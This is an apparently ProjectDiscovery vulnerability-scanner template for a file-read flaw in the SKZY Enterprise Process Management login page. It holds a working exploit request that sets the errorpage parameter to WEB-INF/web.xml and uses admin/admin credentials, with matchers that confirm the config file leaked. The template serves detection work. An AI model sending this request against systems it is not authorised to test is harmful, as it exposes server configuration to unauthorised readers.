id: skzy-enterprise-process-management-login-file-read
info:
  name: SKZY Enterprise Process Management Login File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    This template detects a file read vulnerability in the SKZY Enterprise Process Management and Control System login functionality.
http:
  - method: POST
    path:
      - "{{BaseURL}}/login"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      op=verify%7Clogin&targetpage=&errorpage=WEB-INF/web.xml&mark=&tzo=480&username=admin&password=admin
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<display-name>artery</display-name>"
          - "<listener-class>com.artery.portal.listener.ServletContextListener</listener-class>"
      - type: word
        part: header
        words:
          - "application/xml"
